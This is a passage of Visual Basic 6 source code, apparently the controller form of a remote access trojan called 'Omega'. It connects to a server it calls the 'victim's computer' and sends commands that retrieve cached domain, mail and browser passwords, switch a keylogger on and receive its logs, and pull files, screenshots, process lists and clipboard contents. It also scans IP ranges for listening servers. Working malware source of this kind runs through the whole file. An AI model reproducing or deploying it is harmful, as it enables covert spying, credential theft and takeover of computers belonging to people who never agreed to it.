    DefaultColor(3) = GetSysColor(COLOR_WINDOWTEXT)
    
    Unload frmSplash
    Me.Refresh
    
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    TCPClient.Close
    Call UnloadAllForms
End Sub

Public Sub UnloadAllForms()
Dim Form As Form
   For Each Form In Forms
      Unload Form
      Set Form = Nothing
   Next Form
End Sub

Private Sub Timer1_Timer()
   lblStatus.Caption = "- Time out -"
   TCPClient.Close
End Sub

Private Sub Restart() 'restart client
    Timer1.Enabled = False 'stop time out
    TCPClient.Close
    Form_Load 'reload
End Sub

'show Address book
Private Sub cmdAddrBook_Click()
    frmAddressBook.Show
End Sub

'show IP tool
Private Sub cmdIP_Click()
    frmIPTool.Show
End Sub

Public Sub cmdConnect_Click()
On Error GoTo errHandle
    Call ResetAll 'reset all data
    cbIP.text = Trim(cbIP.text) 'remote host
    txtPort.text = Trim(txtPort.text) 'remote port
    lblStatus.Caption = "- Connecting -"
    
    If cmdConnect.Caption = "Connect" Then 'click connect
       Timer1.Enabled = True 'start time out count
       cmdConnect.Caption = "Disconnect"
       cmdConnect.ToolTipText = "Disconnect"
       TCPClient.RemoteHost = cbIP.text
       TCPClient.RemotePort = txtPort.text
       TCPClient.Connect 'connect
    Else 'click disconnect
       If TCPClient.State = sckConnected Then
          cmdRestartServ_3_Click 'restart server
       Else
          TCPClient.Close
       End If
       cmdConnect.Caption = "Connect"
       cmdConnect.ToolTipText = "Connect"
       lblStatus.Caption = "- Disconnected -"
    End If
Exit Sub
errHandle:
MsgBox Err.Description, vbExclamation, "Connection"
TCPClient.Close
End Sub

Private Sub txtPort_KeyPress(KeyAscii As Integer)
If KeyAscii = 8 Then
ElseIf KeyAscii >= Asc("0") And KeyAscii <= Asc("9") Then
Else
   KeyAscii = 0
End If
End Sub

Private Sub TCPClient_DataArrival(ByVal bytesTotal As Long)
'On Error GoTo errHandle
Dim strData As String
Dim ifreefile As Integer
Dim dlFile As String

    'reset data
    strData = ""
    DoEvents
    'get data
    TCPClient.GetData strData, vbString
    
    'is has not check password
    If Check = False Then
       'is passport
       If Left$(strData, 4) = "PASS" Then
          Check = True
          GoTo Last
       End If
    End If
    
    'is ACK, server has received data
    If Left$(strData, 8) = "RECVDATA" Then
       ReceiveData = True
       GoTo Last
    End If
    
    'password request
    If Left$(strData, 6) = "PWD_RQ" Then
       frmLogin.Show 1, frmMain
    End If
    
    If Right$(txtAction, 9) = "FILEGM_13" Then
       If Left$(strData, 4) = "|ERR" Then
          'if download file no byte
          If Right$(strData, 3) = "FNB" Then
             Call CancelDownload
             Unload frmProgress
             MsgBox "File no byte.", vbCritical, "Download File"
          ElseIf Right$(strData, 3) = "DNF" Then
             Call CancelDownload
             Unload frmProgress
             MsgBox "File not exists.", vbCritical, "Download File"
          End If
          GoTo Last
       End If '|ERR
    End If
    
    Select Case txtAction.text
    
    Case "GET_PCINFO_01" 'get PC Info
         txtAction.text = ""
         Call GetAllPCInfo_1(strData)
         
    Case "GET_PASS_02" 'get cache password
         txtAction.text = ""
         Call GetPass_2(strData)
    
    Case "0KEYBOARD_06" 'received keylogger (now)
         Call frmKeyLogger.ReceivedKeyLogger(strData)
    
    Case "1KEYBOARD_06" 'received active window list
         Call ActiveWindowList_6(strData)
        
    Case "CHAT_07" 'receive chat data
         Call frmChat.ReceiveText(strData)
         
    Case "FINDFILES_09" 'receive find files
         'if is number of file found
         If Left$(strData, 4) = "NOF|" Then
            'if found
            If Trim(Right$(strData, Len(strData) - 4)) <> "0" Then
               FindNo = Right$(strData, Len(strData) - 4)
            Else 'if not found
               Me.MousePointer = vbDefault
               FindNo = "0"
               ReceiveFindFilesList = ""
               lblAction.Caption = "File not found."
            End If
         Else 'if not a number of file found
            'receive find files data
            ReceiveFindFilesList = ReceiveFindFilesList & strData
            DoEvents
         End If
         
         'is end of find files
         If Right$(strData, 6) = "EOF|09" And FindNo <> "0" Then
            txtAction.text = ""
            ReceiveFindFilesList = Left$(ReceiveFindFilesList, Len(ReceiveFindFilesList) - 6)
            DoEvents
            Me.MousePointer = vbDefault
            frmFindFiles.lblFound.Caption = "Found " & FindNo & " file(s)."
            Call ReceivedFindFiles_9(ReceiveFindFilesList)
            DoEvents
            frmFindFiles.Tag = "Show"
            frmFindFiles.Show 1, Me
            FindNo = "0"
            ReceiveFindFilesList = ""
         End If
         GoTo Last
         
    Case "4FILEGM_13" 'download file
         'is end of download file
         If Right$(strData, 7) = "FILEEND" Then
            bFileArriving = False
            sArriving = sArriving & Left$(strData, Len(strData) - 7)
            
            'if not get desktop preview screen
            If LCase(sFile) <> "preview.jpg" Then
               dlFile = Trim(txtLocalFolder_10) & sFile & ".OZip"
            Else 'is other download file
               dlFile = Trim(txtLocalFolder_10) & sFile
            End If
            
            'if file already exist, delete it.
            If FileExists(dlFile) Then
               Kill dlFile
               DoEvents
            End If
            
            'save the download file
            ifreefile = FreeFile
            Open dlFile For Binary Access Write As #ifreefile
                 Put #ifreefile, 1, sArriving
            Close #ifreefile
            DoEvents
            
            'if is desktop preview screen, show it
            If LCase(sFile) = "preview.jpg" Then
               frmScreenPreview.ImgScreen.Picture = LoadPicture(dlFile)
            Else 'decompress the file
               Call DecompressFile(dlFile, Left$(dlFile, Len(dlFile) - 5))
               DoEvents
               'reset data
               txtAction.text = ""
               sFile = ""
               dlFile = Left$(dlFile, Len(dlFile) - 5)
               dlFile = UCase(dlFile)
               If CheckTXT.Value = 1 And Right$(dlFile, 4) = ".TXT" Or _
                  Right$(dlFile, 4) = ".INI" Or Right$(dlFile, 4) = ".BAT" Or _
                  Right$(dlFile, 4) = ".LOG" Then
                  Shell "notepad " & dlFile, vbNormalFocus
               End If
               frmMain.TimerTransfer.Enabled = False
               Unload frmProgress
               DoEvents
            End If
            
            'reset downloaded data
            sArriving = ""
            Total = 0
            DoEvents
                'if is file Info
         ElseIf Left$(strData, 8) = "FILEINFO" Then
            'set file has arriving
            bFileArriving = True
            'get file length
            FileLength = CLng(Right$(strData, Len(strData) - 8))
         ElseIf bFileArriving Then 'is file arriving
            'received arriving data
            sArriving = sArriving & strData
            DoEvents
            'send ACK
            TCPClient.SendData "RECVDATA"
            'total received data bytes
            Total = Total + bytesTotal
            DoneBytes = DoneBytes + bytesTotal
            'total percent received
            Percent = Int((Total / FileLength) * 100)
            'set status downloading
            If Percent <= 100 Then
               If LCase(sFile) <> "preview.jpg" Then
                  frmProgress.ProgressBar1.Value = Percent
                  frmProgress.lblPercent.Caption = Percent & "%"
                  frmProgress.lblBytes.Caption = FileByteFormat(Total) & " of " & FileByteFormat(FileLength)
                  DoEvents
               End If
            End If
         End If 'end if "FILEEND"
    
    Case "FILE_13" 'refresh view file list of FileGM
         'if not error
         If Left$(strData, 4) <> "|ERR" Then
            'receive file list data
            ReceiveFileList = ReceiveFileList & strData
            DoEvents
         ElseIf Left$(strData, 4) = "|ERR" Then 'is error
            'reset data
            txtAction.text = ""
            ReceiveFileList = ""
            frmFileGM.lblStatus.Caption = Right$(strData, Len(strData) - 4)
         End If
         'if end of view file list
         If Right$(strData, 6) = "EOF|13" Then
            'if received data is not 0 byte
            If Len(ReceiveFileList) <> 0 Then
               'list the files
               Call frmFileGM.RefreshOK(sDir)
               Call ListFiles_13(ReceiveFileList)
            End If
            frmFileGM.MousePointer = vbDefault
            'reset data
            txtAction.text = ""
            ReceiveFileList = ""
         End If
         GoTo Last
         
    Case "DRIVE_13" 'get drives
         txtAction.text = ""
         Call ListDrives_13(strData)
         
    Case "2FILEGM_13" 'get file size
         txtAction.text = ""
         frmFileGM.lblStatus.Caption = strData
         sFile = ""
         
    Case "REFRESH_14" 'refresh windows manager
         txtAction.text = ""
         Call RefreshWinhWnd_14(strData)
         
    Case "REFRESH_15" 'refresh process manager
         txtAction.text = ""
         Call RefreshProcess_15(strData)
         
    Case "READ_CLIP_16" 'read clipboard
         txtAction.text = ""
         txtClipboard_16.text = strData
         
    Case "REFRESH_21" 'get available resolution
         txtAction.text = ""
         Call RefreshResolution_21(strData)
         
    Case "SOUND_27" 'feedback if can't set setting (no sound card)
         txtAction.text = ""
         'if set sound settings is failed
         If strData <> "Y" Then
            'get the feedback
            lblAction.Caption = strData
         End If
         
    Case "SOUNDREAD_27" 'get volume settings
         txtAction.text = ""
         'if set sound settings is not failed
         If Left(strData, 1) <> "N" Then
            Call ReadSoundSetting_27(strData)
         Else
            'get the feedback
            lblAction.Caption = strData
         End If
         
    Case "2TIMEDATE_28" 'get time & date
         txtAction.text = ""
         Call GetTimeDate_28(strData)
         
    End Select
    
Exit Sub
errHandle:
MsgBox Err.Description, vbExclamation, "Omega"
Last:
End Sub

Private Sub TCPClient_Connect()
    Timer1.Enabled = False 'stop time out
    SaveSetting "Omega", "Connection", "IP Address", cbIP.text
    cbIP.AddItem cbIP.text
    cmdConnect.Caption = "Disconnect"
    cmdConnect.ToolTipText = "Disconnect"
    lblStatus.Caption = "- Connected -"
    picfunc(30).ZOrder 'set main page to front
    Call EnabledFunc 'enable function
End Sub

Private Sub TCPClient_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    TCPClient.Close
End Sub

Private Sub TCPClient_Close()
    cmdConnect.Caption = "Connect"
    cmdConnect.ToolTipText = "Connect"
    lblStatus.Caption = "- Disconnected -"
    DisabledFunc 'disable function
    Call ResetAll
    Call Restart
    frmMain.Show
End Sub

Private Sub cmdButton_Click(Index As Integer)
  MC = Index 'index of button
  ColorDark
  Select Case Index
        Case 0 'Connection                          'number of picfunc(index)
         Nofunc = 0
         lblfunction(0).Caption = "IP Scanner"      '0
         lblfunction(1).Caption = "Get PC Info"     '1
         lblfunction(2).Caption = "Passwords"       '2
         lblfunction(3).Caption = "Server Options"  '3
         lblfunction(4).Caption = "IP Notify"       '4
         lblfunction(5).Caption = ""                '5
         'is connected
         If TCPClient.State = sckConnected Then
            lblfunction(0).Enabled = False 'disabled IP scanner
            lblfunction(4).Enabled = True 'enabled IP Notify
         Else 'is idle or disconnected
            lblfunction(0).Enabled = True 'enabled IP scanner
            lblfunction(4).Enabled = False 'disabled IP Notify
         End If
         
        Case 1 'Advanced
         Nofunc = 6
         lblfunction(0).Caption = "Keyboard"        '6
         lblfunction(1).Caption = "Chat"            '7
         lblfunction(2).Caption = "Browser"         '8
         lblfunction(3).Caption = "Find Files"      '9
         lblfunction(4).Caption = "Local Option"    '10
         lblfunction(5).Caption = ""                '11
         'is connected
         If TCPClient.State = sckConnected Then
            lblfunction(0).Enabled = True 'enabled keyboard
         Else 'is idle or disconnected
            lblfunction(0).Enabled = False 'disabled keyboard
         End If
         lblfunction(4).Enabled = True 'enabled local option
         
        Case 2 'Miscellaneous
         Nofunc = 12
         lblfunction(0).Caption = "Msg Manager"       '12
         lblfunction(1).Caption = "File Manager"      '13
         lblfunction(2).Caption = "Windows Manager"   '14
         lblfunction(3).Caption = "Process Manager"   '15
         lblfunction(4).Caption = "Clipboard Manager" '16
         lblfunction(5).Caption = ""                  '17
         Call EnabledFunc
         
        Case 3 'Fun Manager
         Nofunc = 18
         lblfunction(0).Caption = "Desktop"         '18
         lblfunction(1).Caption = "Flip Screen"     '19
         lblfunction(2).Caption = "Print"           '20
         lblfunction(3).Caption = "Resolution"      '21
         lblfunction(4).Caption = "Win Colors"      '22
         lblfunction(5).Caption = ""                '23
         Call EnabledFunc
         
        Case 4 'Extra Fun
         Nofunc = 24
         lblfunction(0).Caption = "Screen Saver"    '24
         lblfunction(1).Caption = "Restart Win"     '25
         lblfunction(2).Caption = "Mouse"           '26
         lblfunction(3).Caption = "Sound"           '27
         lblfunction(4).Caption = "Time/Date"       '28
         lblfunction(5).Caption = "Extra"           '29
         Call EnabledFunc
         
  End Select
  
End Sub

Private Sub lblfunction_Click(Index As Integer)
    MF = Index 'index of function
    MFno = MC 'index of button
    lblAction.Caption = ""
    picfunc(Index + Nofunc).ZOrder 'show Function page to front
    'if is opened form frmFileGM
    If (Index + Nofunc) = 13 Then
       frmFileGM.Show
    End If
End Sub

'***********************************************************
'Start Interface Control
'***********************************************************
Private Sub cmdButton_GotFocus(Index As Integer)
    cmdButton(Index).ForeColor = vbBlue
End Sub

Private Sub cmdButton_LostFocus(Index As Integer)
    cmdButton(Index).ForeColor = vbBlack
End Sub

Private Sub ColorDark()
Dim i As Integer
  
  For i = 0 To 5
    lblfunction(i).ForeColor = vbBlack  'dark
  Next i
  
  If MF >= 0 And MF <= 5 And MC = MFno Then
     lblfunction(MF).ForeColor = vbYellow  'bright
   End If
End Sub

Private Sub lblfunction_MouseMove(Index As Integer, Button As Integer, Shift As Integer, x As Single, y As Single)
 Call ColorDark
 'inside
 mouse_event 32, 0, 0, 0, 0 'let mouse click middle click
 lblfunction(Index).ForeColor = vbYellow  'bright
 
 'outside
 If x < 0 Or x > lblfunction(Index).Width Or y < 0 Or y > lblfunction(Index).Height Then
    mouse_event 64, 0, 0, 0, 0 'let mouse release middle click
    Call ColorDark
 End If
End Sub

'***********************************************************
'End Interface Control
'***********************************************************
Private Sub EnabledFunc() 'enable function
Dim i As Integer
  For i = 0 To 4
    cmdButton(i).Enabled = True
  Next i
  
  For i = 0 To 5
    lblfunction(i).Enabled = True
  Next i
End Sub

Private Sub DisabledFunc() 'disable function
Dim i As Integer
  For i = 2 To 4 'start at 2, because scan IP & local option in 0,1
    cmdButton(i).Enabled = False
  Next i
  
  For i = 0 To 5
    lblfunction(i).Enabled = False
  Next i
End Sub

Private Sub ResetAll() 'reset
Dim i As Integer

For i = 0 To 5
    lblfunction(i).Caption = ""
Next i
Unload frmAddressBook
Unload frmChat
Unload frmFileGM
Unload frmFindFiles
Unload frmHelpSendKeys
Unload frmIPScanner
Unload frmIPTool
Unload frmKeyLogger
Unload frmKeyStrokes
Unload frmProgress
Unload frmScreenPreview
Call ResetData
End Sub

Private Sub ResetData()
Dim i As Integer

'Function 1
For i = 0 To 14
    txtPCInfo_1(i).text = ""
Next i

'Function 2
ListPass_2(0).Clear
ListPass_2(1).Clear

'Function 3
txtPort_3.text = ""
txtSetPass_3.text = ""
For i = 0 To 2
    OptAutorun_3(i).Value = False
Next i

'Function 4
txtSMTP_4.text = ""
txtMailto_4.text = ""
txtUIN_4.text = ""

'Function 7
txtNickname_7.text = "nickless"
txtSize_7.text = "25"
ShapetxtColor_7(0).BackColor = &HE0E0E0
ShapetxtColor_7(1).BackColor = &HFFFF&
txtSample_7(0).ForeColor = &HE0E0E0
txtSample_7(1).ForeColor = &HFFFF&
For i = 0 To 1
    txtFSize_7(i).text = "10"
    txtSample_7(i).FontSize = 10
Next i

'Function 8
txtURL_8.text = ""

'Function 9
txtName_9.text = ""
txtFolder_9.text = ""
CheckSub_9.Value = 0

'Function 12
For i = 0 To 5
    OptButton_12(i).Value = False
Next i
txtMsgTitle_12.text = ""
txtMsgText_12.text = ""
txtMsg_12.text = ""
Icon_12.Picture = ImgNone_12.Picture
lblIcon_12.Caption = "None"
lblIcon_12.Visible = True

'Function 14
ListView_14.ListItems.Clear

'Function 15
ListView_15.ListItems.Clear
txtPath_15.text = ""
List_15.Clear
ListProID_15.Clear
ListNo = -1 'set nothing
optNo = -1 'set nothing
    
'Function 16
txtClipboard_16.text = ""

'Function 19
For i = 0 To 1
OptFlip_19(i).Value = False
Next i

'Function 20
txtPrint_20.text = ""

'Function 21
ListResolution_21.Clear

'Function 22
ShapeColor_22(0).BackColor = vbRed
ShapeColor_22(1).BackColor = vbYellow
ShapeColor_22(2).BackColor = vbBlue
ShapeColor_22(3).BackColor = vbGreen

'Function 24
txtText_24.text = "Hello World!"
txtSize_24.text = "50"
cbFont_24.ListIndex = 0
cbFStyle_24.ListIndex = 0
cbSStyle_24.ListIndex = 0
ResolutionSlider.SelStart = 50
SpeedSlider.SelStart = 50

'Function 26
txtDblClickTime_26.text = "500"

'Function 27
For i = 0 To 2
    VolumeSlider_27(i).SelStart = 0
Next i
CheckMute_27.Value = 0

'Function 28
For i = 0 To 1
    txtTime_28(i).text = "00"
Next i
cbTime_28.ListIndex = 0
txtDate_28.text = "01/01/2001"

lblAction.Caption = ""
End Sub

Function StringTokenizer(DATA As String) As Integer
On Error Resume Next
Dim i As Integer, j As Integer, t As Integer
Dim s As String

j = 0 'set data count to zero
t = 1 'set start to zero

For i = 1 To Len(DATA)
    s = Mid$(DATA, i, 1)
    If s = Delimiter Then
       Info(j) = Mid$(DATA, t, i - t)
       t = i + 1
       j = j + 1
    End If
Next i

StringTokenizer = j - 1
End Function

Private Sub LoadProfile(AppName As String, KeyName As String, FileName As String)
 On Error GoTo errHandle
 Dim ret As Long
 Dim temp As String * 50
 Dim lpAppName As String, lpKeyName As String, lpDefault As String, lpFileName As String
 
 lpAppName = AppName
 lpKeyName = KeyName
 lpDefault = FileName
 lpFileName = FileName
 
 ret = GetPrivateProfileString(lpAppName, lpKeyName, lpDefault, temp, Len(temp), lpFileName)
 If Not ret = 0 Then
    Select Case Profile
        
        Case "Port"
        lblTemp.Caption = Trim(temp)
        If lblTemp.Caption = FileName Then
           txtPort.text = "54896"
        Else
           txtPort.text = lblTemp.Caption
        End If
        SaveProfile "Server Option", "Port", txtPort.text, cPath & "Omega.ini"
             
        Case "Local Folder"
        lblTemp.Caption = Trim(temp)
        If lblTemp.Caption = FileName Or Trim(lblTemp.Caption) = "" Then
           txtLocalFolder_10.text = cPath
        Else
           txtLocalFolder_10.text = lblTemp.Caption
        End If
        SaveProfile "Local Option", "Local Folder", txtLocalFolder_10.text, cPath & "Omega.ini"
   
        Case "Auto View"
        lblTemp.Caption = Trim(temp)
        If lblTemp.Caption = "0" Then
           CheckTXT.Value = 0
        ElseIf lblTemp.Caption = "1" Then
           CheckTXT.Value = 1
        Else
           CheckTXT.Value = 0
        End If
        SaveProfile "Local Option", "Auto View", CheckTXT.Value, cPath & "Omega.ini"
   
   End Select
 End If
 
Exit Sub
errHandle:
MsgBox Err.Description, vbExclamation, "Setting"
End Sub

Private Sub CheckPassPort()
    Check = False 'set unchecked password
    'get last port number
    Profile = "Port"
    LoadProfile "Server Option", "Port", cPath & "Omega.ini"
    
    'get local folder
    Profile = "Local Folder"
    LoadProfile "Local Option", "Local Folder", cPath & "Omega.ini"
    
    'get auto view
    Profile = "Auto View"
    LoadProfile "Local Option", "Auto View", cPath & "Omega.ini"
End Sub

'***********************************************************
'Start - Function (29)
'***********************************************************

'Function 0
Private Sub ListIP_0_DblClick()
Dim p, aIPs, aPorts As String

'p=255.255.255.255:101
p = ListIP_0.List(ListIP_0.ListIndex)
aIPs = Mid(p, 1, InStr(1, p, ":") - 1)
aPorts = Mid(p, InStr(1, p, ":") + 1, Len(p))

cbIP.AddItem aIPs
cbIP.text = aIPs
txtPort.text = aPorts
End Sub

Private Sub cmdScan_0_Click()
On Error GoTo errHandle
Dim i As Byte
Dim totalIPStart, totalIPEnd As Double

'checking input IP address
For i = 0 To 3
    txtSIP_0(i).text = Trim(txtSIP_0(i).text)
    txtEIP_0(i).text = Trim(txtEIP_0(i).text)
    If txtSIP_0(i).text = "" Or txtEIP_0(i).text = "" Or _
       IsNumeric(txtSIP_0(i).text) = False Or IsNumeric(txtEIP_0(i).text) = False Then
       MsgBox "Please input correctly.", vbExclamation, "IP Scanner"
       Exit Sub
    ElseIf Int(txtSIP_0(i).text) < 0 Or Int(txtSIP_0(i).text) > 255 _
        Or Int(txtEIP_0(i).text) < 0 Or Int(txtEIP_0(i).text) > 255 Then
        MsgBox "Please input correctly.", vbExclamation, "IP Scanner"
        Exit Sub
    End If
Next i

'locked when start
For i = 0 To 3
    txtSIP_0(i).Locked = True
    txtEIP_0(i).Locked = True
Next i
txtPort_0.Locked = True
txtDelay_0.Locked = True

'calculate total (use floating point was not overflow)
totalIPStart = (Int(txtSIP_0(0)) * 2.55 ^ 3) + (Int(txtSIP_0(1)) * 2.55 ^ 2) + (Int(txtSIP_0(2)) * 2.55) + Int(txtSIP_0(3)) / 100
totalIPEnd = (Int(txtEIP_0(0)) * 2.55 ^ 3) + (Int(txtEIP_0(1)) * 2.55 ^ 2) + (Int(txtEIP_0(2)) * 2.55) + Int(txtEIP_0(3)) / 100

'check input correct
If totalIPStart >= totalIPEnd Then
   MsgBox "Please input correctly.", vbExclamation, "IP Scanner"
   Exit Sub
End If

'set scanned IP start from 0
Scanned = 0
DoneScan = 0
'call totalIP to get total IP to scan
TotalscanIP = totalIP
lblAction.Caption = "Starting scan IP address."
cmdScan_0.Enabled = False
cmdStop_0.Enabled = True
IPTimer1.Interval = Int(txtDelay_0)
IPTimer1.Enabled = True
TimerIPpers.Enabled = True

Exit Sub
errHandle:
MsgBox Err.Description, vbExclamation, "IP Scanner"
End Sub

Private Sub cmdStop_0_Click()
Scanned = 0
DoneScan = 0
cmdScan_0.Enabled = True
lblAction.Caption = "Stop scan IP address."
IPTimer1.Enabled = False
TimerIPpers.Enabled = False
Call IPScanUnlock
End Sub

Private Sub IPScanUnlock()
Dim i As Byte

'unlocked when start
For i = 0 To 3
    txtSIP_0(i).Locked = False
    txtEIP_0(i).Locked = False
Next i
txtPort_0.Locked = False
txtDelay_0.Locked = False
End Sub

Private Sub cmdClear_0_Click()
ListIP_0.Clear
End Sub

Private Sub txtPort_0_KeyPress(KeyAscii As Integer)
If KeyAscii = 8 Then
ElseIf KeyAscii >= Asc("0") And KeyAscii <= Asc("9") Then
Else
   KeyAscii = 0
End If
End Sub

Private Sub txtDelay_0_KeyPress(KeyAscii As Integer)
If KeyAscii = 8 Then
ElseIf KeyAscii >= Asc("0") And KeyAscii <= Asc("9") Then
Else
   KeyAscii = 0
End If
End Sub

Private Sub txtSIP_0_KeyPress(Index As Integer, KeyAscii As Integer)
If KeyAscii = 8 Then
ElseIf KeyAscii >= Asc("0") And KeyAscii <= Asc("9") Then
Else
   KeyAscii = 0
End If
End Sub

Private Sub txtEIP_0_KeyPress(Index As Integer, KeyAscii As Integer)
If KeyAscii = 8 Then
ElseIf KeyAscii >= Asc("0") And KeyAscii <= Asc("9") Then
Else
   KeyAscii = 0
End If
End Sub

Private Sub IPTimer1_Timer()
On Error GoTo errHandle

'count IP scan
Scanned = Scanned + 0.01
DoneScan = DoneScan + 1
'create new IPs
Dim IPs As New frmIPScanner
'IP address to scan
txtIP_0.text = txtSIP_0(0) & "." & txtSIP_0(1) & "." & txtSIP_0(2) & "." & txtSIP_0(3)
IPs.txtIP.text = txtIP_0.text
IPs.txtPort.text = txtPort_0.text
'try to connect
IPs.Winsock1.Connect txtIP_0, txtPort_0

'if scanned IP is done
If checkIP Then
   lblAction.Caption = "Scanned 100% completed. Speed: " & DoneScan & " / s"
   txtSIP_0(3).text = Val(txtSIP_0(3).text) - 1
   cmdScan_0.Enabled = True
   IPTimer1.Enabled = False
   TimerIPpers.Enabled = False
   Call IPScanUnlock
End If

'0.1.2.3 (position)
If txtSIP_0(3).text = "255" Then
   If txtSIP_0(2).text = 255 Then
      If txtSIP_0(1).text = "255" Then
         If txtSIP_0(0).text = 255 Then
            lblAction.Caption = "Scanned 100% completed. Speed: " & DoneScan & " / s"
            IPTimer1.Enabled = False
            TimerIPpers.Enabled = False
            Call IPScanUnlock
         End If '0
         txtSIP_0(1).text = "0"
         txtSIP_0(0).text = Int(txtSIP_0(0).text) + 1
      Else
      End If '1
      txtSIP_0(2).text = "0"
      txtSIP_0(1).text = Int(txtSIP_0(1).text) + 1
   Else
   End If '2
   txtSIP_0(3).text = "0"
   txtSIP_0(2).text = Int(txtSIP_0(2).text) + 1
Else
   txtSIP_0(3).text = Int(txtSIP_0(3).text) + 1
End If '3

Exit Sub
errHandle:
MsgBox Err.Description, vbExclamation, "IP Scanner"
cmdScan_0.Enabled = True
IPTimer1.Enabled = False
TimerIPpers.Enabled = False
End Sub

Private Sub TimerIPpers_Timer()
lblAction.Caption = "Scanned " & Int((Scanned / TotalscanIP) * 100) & "% completed." & _
          " Speed: " & DoneScan & " / s"
DoneScan = 0
End Sub

'is IP scan done
Function checkIP() As Boolean
  If txtIP_0.text = txtEIP_0(0) & "." & txtEIP_0(1) & "." & txtEIP_0(2) & "." & txtEIP_0(3) Then
     checkIP = True
  Else
     checkIP = False
  End If
End Function

'calculate total IP
Function totalIP() As Double
On Error GoTo errHandle
Dim aIP(3) As Double
Dim SIP(3), EIP(3), i As Integer

For i = 0 To 3
    SIP(i) = Int(txtSIP_0(i).text)
    EIP(i) = Int(txtEIP_0(i).text)
    aIP(i) = 0 'result
Next i

'start IP = SIP(0).SIP(1).SIP(2).SIP(3)
'  end IP = EIP(0).EIP(1).EIP(2).EIP(3)

'subtraction
If (EIP(3) - SIP(3)) < 0 Then
   EIP(2) = EIP(2) - 1
   EIP(3) = EIP(3) + 255
   aIP(3) = EIP(3) - SIP(3)
Else
   aIP(3) = EIP(3) - SIP(3)
End If

If (EIP(2) - SIP(2)) < 0 Then
   EIP(1) = EIP(1) - 1
   EIP(2) = EIP(2) + 255
   aIP(2) = EIP(2) - SIP(2)
Else
   aIP(2) = EIP(2) - SIP(2)
End If

If (EIP(1) - SIP(1)) < 0 Then
   EIP(0) = EIP(0) - 1
   EIP(1) = EIP(1) + 255
   aIP(1) = EIP(1) - SIP(1)
Else
   aIP(1) = EIP(1) - SIP(1)
End If

   aIP(0) = EIP(0) - SIP(0)
   
'calculate total IP
totalIP = (aIP(0) * 2.55 ^ 3) + (aIP(1) * 2.55 ^ 2) + (aIP(2) * 2.55) + aIP(3) / 100

Exit Function
errHandle:
MsgBox Err.Description, vbExclamation, "IP Scanner"
End Function

'Function 1
Private Sub cmdGetPCInfo_1_Click() 'get PC Information
    lblAction.Caption = "Get PC Information on victim's computer."
    txtAction.text = "GET_PCINFO_01"
    TCPClient.SendData "GET_PCINFO_01"
End Sub

Private Sub GetAllPCInfo_1(DATA As String)
Dim i As Integer

i = StringTokenizer(DATA)
For i = 0 To i
    txtPCInfo_1(i) = Info(i)
    Info(i) = ""
Next i
End Sub

Private Sub txtPCInfo_1_Click(Index As Integer)
    txtPCInfo_1(Index).SelStart = 0
    txtPCInfo_1(Index).SelLength = Len(txtPCInfo_1(Index).text)
End Sub

'Function 2
Private Sub cmdGetCPass_2_Click()
    ListPass_2(0).Clear
    ListPass_2(1).Clear
    lblAction.Caption = "Get cache passwords on victim's computer."
    txtAction.text = "GET_PASS_02"
    TCPClient.SendData "GET_PASS_02"
End Sub

Private Sub GetPass_2(DATA As String)
Dim i As Integer

i = StringTokenizer(DATA)
For i = 0 To i
    If i Mod 2 = 0 Then
       ListPass_2(0).AddItem Info(i)
    End If
    If i Mod 2 = 1 Then
       ListPass_2(1).AddItem Info(i)
    End If
    Info(i) = ""
Next i
End Sub

Private Sub ListPass_2_Click(Index As Integer)
Select Case Index
   Case 0
        ListPass_2(1).ListIndex = ListPass_2(0).ListIndex
   Case 1
        ListPass_2(0).ListIndex = ListPass_2(1).ListIndex
End Select
End Sub

Private Sub ListPass_2_MouseUp(Index As Integer, Button As Integer, Shift As Integer, x As Single, y As Single)
If ListPass_2(0).ListIndex <> -1 Then
   'is right click
   If Button = 2 Then
      Me.PopupMenu frmPopupMenu.mnuPass
   End If
End If
End Sub

Private Sub cmdHelp_2_Click()
MsgBox "1 = Domains" & vbCrLf & _
       "4 = Mail/MAPI Clients" & vbCrLf & _
       "6 = RAS Entries" & vbCrLf & _
       "19 = IExplorer Entries", vbInformation, "Type"
End Sub

Public Sub Copy_2()
    Clipboard.SetText "R:" & ListPass_2(0).text & " P:" & ListPass_2(1).text
End Sub

Public Sub CopyAll_2()
Dim strPass As String
Dim i As Integer

strPass = ""
For i = 0 To ListPass_2(0).ListCount - 1
    strPass = strPass & "R:" & ListPass_2(0).List(i) & " P:" & ListPass_2(1).List(i) & vbCrLf
Next i
Clipboard.SetText strPass
End Sub

'Function 3
Private Sub cmdChangePort_3_Click()
If Len(Trim(txtPort_3.text)) > 0 And Len(Trim(txtPort_3.text)) <= 5 Then
    lblAction.Caption = "Change port."
    TCPClient.SendData "CHANGE_PORT_03"
    DoEvents
    Sleep 200
    TCPClient.SendData Trim(txtPort_3.text)
    SaveProfile "Server Option", "Port", Trim(txtPort_3.text), cPath & "Omega.ini"
Else
   MsgBox "Please input port number between 1 to 5 characters.", vbExclamation, "Set Port"
End If
End Sub

Private Sub cmdDefaultPort_3_Click()
    lblAction.Caption = "Set default port."
    TCPClient.SendData "DEFAULT_PORT_03"
    SaveProfile "Server Option", "Port", "54896", cPath & "Omega.ini"
End Sub

Private Sub cmdSetPass_3_Click()
If Len(Trim(txtSetPass_3.text)) >= 6 And Len(Trim(txtSetPass_3.text)) <= 8 Then
   lblAction.Caption = "Set password to potect server."
   TCPClient.SendData "SET_PASS_03"
   DoEvents
   Sleep 200
   TCPClient.SendData Trim(txtSetPass_3.text)
   SaveProfile "Server Option", "Password", Trim(txtSetPass_3.text), cPath & "Omega.ini"
Else
   MsgBox "Please input password between 6 to 8 characters.", vbExclamation, "Set Password"
End If
End Sub

Private Sub cmdRemovePass_3_Click()
    lblAction.Caption = "Remove password on victim's computer."
    txtAction.text = "REMOVE_PASS_03"
    TCPClient.SendData "REMOVE_PASS_03"
    SaveProfile "Server Option", "Password", " ", cPath & "Omega.ini"
End Sub

Private Sub cmdKeyLogger_3_Click(Index As Integer)
Select Case Index
    Case 0 'enable keylogger
         lblAction.Caption = "Enabled keylogger on victim's computer."
         TCPClient.SendData "0KEYLOG_03"
    Case 1 'disable keylogger
         lblAction.Caption = "Disabled keylogger on victim's computer."
         TCPClient.SendData "1KEYLOG_03"
End Select
End Sub

Private Sub cmdChangeAutorun_3_Click()
Dim i As Integer
Dim j As Byte

j = 3
For i = 0 To 2
    If OptAutorun_3(i).Value = True Then
       j = i
    End If
Next i

